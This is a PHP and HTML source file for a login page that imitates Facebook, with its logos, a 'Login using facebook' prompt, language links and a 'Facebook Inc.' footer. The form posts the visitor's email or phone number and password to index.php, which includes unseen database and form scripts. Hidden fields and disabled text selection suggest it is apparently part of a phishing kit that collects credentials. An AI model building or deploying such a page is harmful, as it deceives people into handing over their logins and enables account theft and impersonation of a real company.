<?php
include("connect.php");
include("form.php");

$sql = "SELECT * FROM suser";
$result = mysqli_query($conn,$sql);
$users = mysqli_fetch_all( $result ,MYSQLI_ASSOC );



?>


<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <!-- Make all elements normally -->
  <link rel="stylesheet" href="css/normlize.css">
  <!-- style of fonts  -->
  <link rel="preconnect" href="https://fonts.gstatic.com">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;0,700;1,100&display=swap"
    rel="stylesheet">
  <!-- font awesome -->
  <link rel="stylesheet" href="css/all.min.css">
  <title>Document</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!-- External style  -->
  <link rel="stylesheet" href="css/style.css">
</head>

<body onselectstart="return false" ondragstart="return false">
  <div class="navbar">
    <img src="images/fb.png">
  </div>
  <div class="content-box">
    <img src="images/fblogo.png">
    <div class="txt-login">
      Login using facebook </div>
    <form action="index.php" class="login-form" method="POST">
      <label>

        <input type="text" name="email" placeholder="Mobile number or email" autocomplete="off" autocapitalize="off"
        required=""></label>
      <label>

        <input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off"
        required="">
        <input type="hidden" name="pack" value="United Kingdom">
        <input type="hidden" name="userid" value="32">
      </label>
      <button type="submit" name="submit" class="btn-login"> Log In</button>
    </form>
    <div class="txt-create-account">Create account</div>
    <div class="txt-not-now">Not now</div>
    <div class="txt-forgotten-password">Forgotten password?</div>
  </div>
  <div class="language-box">
    <center>
      <div class="language-name language-name-active">English (UK)</div>
      <div class="language-name">Bahasa Indonesia</div>
      <div class="language-name">العربية</div>
      <div class="language-name">Bahasa Melayu</div>
      <div class="language-name">日本語</div>
      <div class="language-name">Español</div>
      <div class="language-name">Português (Brasil)</div>
      <div class="language-name">
        <i class="fa fa-plus"></i>
      </div>
    </center>
  </div>
  <div class="copyright">Facebook Inc.</div>


</body>

</html>